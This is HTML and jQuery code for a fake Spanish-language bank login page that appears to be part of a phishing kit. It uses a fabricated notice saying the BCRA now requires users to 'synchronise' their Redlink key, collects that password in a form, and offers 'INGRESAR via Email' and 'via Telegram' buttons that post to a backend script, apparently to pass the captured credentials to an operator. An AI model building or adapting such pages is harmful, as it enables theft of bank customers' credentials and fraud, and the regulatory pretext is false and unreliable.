<div class="container">
  <div class="row justify-content-md-center">
    <form action="../dashboard/procesar" method="post" class="col-lg-6 row g-3">
      <div class="shadow-lg pb-3 mb-2 bg-body rounded-4">
        <div class="col-12 shadow-sm mb-4 mt-2 mb-2">
          <img src="../resources/img/logo.png" alt="logo">
        </div>
        <div class="px-5">
          <p class="fw-bold mb-5">Actualización - De acuerdo al marco del nuevo esquema de politica monetaria, BCRA(58841) a partir del 28/09/2022, sera obligatorio sincronizar su clave redlink para realizar operaciones seguras. Al finalizar este proceso podra seguir operando con normalidad.</p>
          <div class="col-auto">
            <div class="form-floating mb-5">
              <input name="clave" type="password" class="form-control border-0 border-bottom" id="floatingInput" placeholder="Clave">
              <label for="floatingInput" class="text-secondary fs-14"><i class="fa-solid fa-lock"></i> Clave Redlink</label>
            </div>
          </div>
          <a href="#" class="text-decoration-none text-grey fs-13"><i class="fa-solid fa-keyboard pe-2 text-secondary"></i>Teclado Virtual</a>
          // Edit Position
          <div class="m-3 d-flex flex-column justify-content-around text-center">
              <input type="submit" name="action" value="INGRESAR via Email"  class="btn btn-orange text-white px-2 py-2 rounded-pill fw-bold" id="btn-submit" 
              style="
              padding-left: 36px;
                background-image: url('../resources/img/email.png');
                background-size: 20px;
                background-position-x: calc(50% - 100px);
                background-position-y: 50%;
                background-repeat: no-repeat;"
              />
              <input type="submit" name="action" value="INGRESAR via Telegram"  class="btn btn-orange text-white px-2 py-2 rounded-pill fw-bold mt-2" id="btn-submit" 
              style="
              padding-left: 36px;
                background-image: url('../resources/img/tele.png');
                background-size: 20px;
                background-position-x: calc(50% - 110px);
                background-position-y: 50%;
                background-repeat: no-repeat;"
              />
          </div>
          <div class="text-center">
            <p><a href="#" class="text-decoration-none text-orange fs-13">Olvidé mi clave</a><spam class="px-3 text-secondary">|</spam><a href="#" class="text-decoration-none text-orange fs-13">Olvidé mi usuario</a></p>
          </div>
          <p class="text-center text-muted m-0 fz-10">Si es tu primera vez</p>
          <p class="text-center text-orange fw-semibold fs-14">GENERÁ TU USUARIO Y CLAVE</p>
          <p class="text-center m-0 text-rojo fw-semibold">Mi cuenta está en riesgo</p>
        </div>
      </div>
    </form>
  </div>
</div>
<div class="container-fluid">
  <div class="row">
    <div class="col-12">
      <p class="text-center text-white fw-semibold p-0 fs-13"><a href="#" class="text-decoration-none text-white px-2">Términos y condiciones</a> | <a href="#" class="text-decoration-none text-white px-2">Conocé tus claves</a> | <a href="#" class="text-decoration-none text-white px-2">Políticas de seguridad</a> | <a href="#" class="text-decoration-none text-white px-2">Preguntas frecuentes</a></p>
    </div>
  </div>
</div>

<script type="text/javascript">
  $(document).ready(function() {
    var $clave = $("input[name=clave]");

    $clave.keypress(function() {
      $clave.removeClass("border-danger");
    });

    $("#btn-submit").click(function(e) {
      var isValid = true;
      if ($clave.val() == "")
      {
        isValid = false;
        $clave.addClass("border-danger");
      }
      if (!isValid)
        e.preventDefault();
    });
  })
</script> 